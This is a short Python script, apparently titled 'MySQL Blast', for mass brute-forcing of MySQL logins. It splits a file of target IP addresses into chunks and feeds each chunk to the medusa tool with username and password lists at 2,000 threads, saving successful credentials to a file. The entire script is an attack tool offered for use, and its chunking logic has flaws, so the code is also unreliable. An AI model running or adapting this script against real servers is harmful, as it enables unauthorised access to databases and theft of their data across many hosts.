#!/usr/bin/env python
#coding:utf-8
import os
import subprocess

def Segmentation(): #分割txt

    with open("ips.txt",'r') as file:
        i=0
        j=0
        for ips in file:
            if i<=5000:
                f=open("iplist"+str(j)+".txt",'a+')
                f.write(ips)
                i+=1
            else:
                Blast("iplist"+str(j)+".txt")
                i=0
                j+=1

def Blast(fileNames):#爆破

    subprocess.call("medusa -H "+fileNames+" -U user.txt -P pass.txt -M mysql -T 2000 -O good.txt", shell=True)
    os.remove(fileNames)
    print(u"Done")

def run():

    print("""
    
    __  ___      _____       __   ____  __           __
   /  |/  /_  __/ ___/____ _/ /  / __ )/ /___ ______/ /_
  / /|_/ / / / /\__ \/ __ `/ /  / __  / / __ `/ ___/ __/
 / /  / / /_/ /___/ / /_/ / /  / /_/ / / /_/ (__  ) /_
/_/  /_/\__, //____/\__, /_/  /_____/_/\__,_/____/\__/
       /____/         /_/

    
    """)
    Segmentation()


if __name__ == '__main__':
    run()
